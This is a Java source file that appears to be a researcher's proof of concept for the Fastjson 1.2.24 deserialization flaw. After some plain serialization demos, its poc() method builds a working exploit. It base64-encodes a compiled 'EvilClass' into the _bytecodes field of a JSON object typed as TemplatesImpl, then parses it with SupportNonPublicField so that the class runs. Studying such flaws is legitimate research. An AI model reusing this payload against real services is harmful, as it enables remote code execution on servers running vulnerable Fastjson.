package com.orleven.fastjson;

import org.apache.commons.io.IOUtils;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import com.alibaba.fastjson.parser.Feature;
import java.io.IOException;
import com.alibaba.fastjson.JSON;
import org.apache.commons.codec.binary.Base64;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;

import java.util.HashMap;
import java.util.Map;

public class Fastjson1224 {

    public void test(){
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("key1", "One");
        map.put("key2", "Two");
        String mapJson = JSON.toJSONString(map);
        System.out.println(mapJson);

        User user1 = new User();
        user1.setUsername("orleven");
        user1.setAge(18);
        System.out.println("obj name:" + user1.getClass().getName());
        System.out.println();

        //序列化
        String serializedStr = JSON.toJSONString(user1);
        System.out.println("serializedStr = " + serializedStr);
        String serializedStr1 = JSON.toJSONString(user1, SerializerFeature.WriteClassName);
        System.out.println("serializedStr1 = " + serializedStr1);
        System.out.println();

        //通过parse方法进行反序列化
        Object obj1 = (Object)JSON.parse(serializedStr1);
        System.out.println(obj1);
        System.out.println("obj1 name: " + obj1.getClass().getName()+"\n");
        System.out.println();

        //通过parseObject方法进行反序列化  通过这种方法返回的是一个JSONObject
        Object obj2 = JSON.parseObject(serializedStr1);
        System.out.println(obj2);
        System.out.println("obj2 name: " + obj2.getClass().getName()+"\n");
        System.out.println();

        //通过这种方式返回的是一个相应的类对象
        Object obj3 = JSON.parseObject(serializedStr1, Object.class);
        System.out.println(obj3);
        System.out.println("obj3 name: " + obj3.getClass().getName());
        System.out.println();



    }

    public void poc(){

        String myJSON = "{\"@type\":\"me.lightless.fastjsonvuln.User\",\"age\":99,\"username\":\"lightless\",\"secret\":\"2333\"}";
        System.out.println(myJSON);
        JSONObject u3 = JSON.parseObject(myJSON);
        System.out.println("u3 => " + u3.get("secret"));

        final String fileSeparator = System.getProperty("file.separator");
        System.out.println("fileSeparator:" + fileSeparator);


        ParserConfig config = new ParserConfig();
        String evil_path = "/Users/orleven/Product/test/target/classes/com/orleven/fastjson/EvilClass.class";
        String evil_code = readClass(evil_path);

        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        String pocJson = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evil_code+"\"]," +
                "'_name':'a.b'," +
                "'_tfactory':{ }," +
                "\"_outputProperties\":{ }}\n";

        System.out.println(pocJson);
        // com/alibaba/fastjson/parser/deserializer/FieldDeserializer.class
        Object object = JSON.parseObject(pocJson, Object.class, config, Feature.SupportNonPublicField);
        System.out.println("type:"+ object.getClass().getName() +" "+ object);

        /*
            parse(jsonStr) 构造方法+Json字符串指定属性的setter()+特殊的getter()
            parseObject(jsonStr) 构造方法+Json字符串指定属性的setter()+所有getter() 包括不存在属性和私有属性的getter()
            parseObject(jsonStr,*.class) 构造方法+Json字符串指定属性的setter()+特殊的getter()
         */

    }

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }

        String result = Base64.encodeBase64String(bos.toByteArray());

        return result;
    }


    public static void main(String args[]){

        try {
            // https://www.cnblogs.com/litlife/p/9986427.html
            Fastjson1224 fastjson1224 = new Fastjson1224();
            fastjson1224.test();

            fastjson1224.poc();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
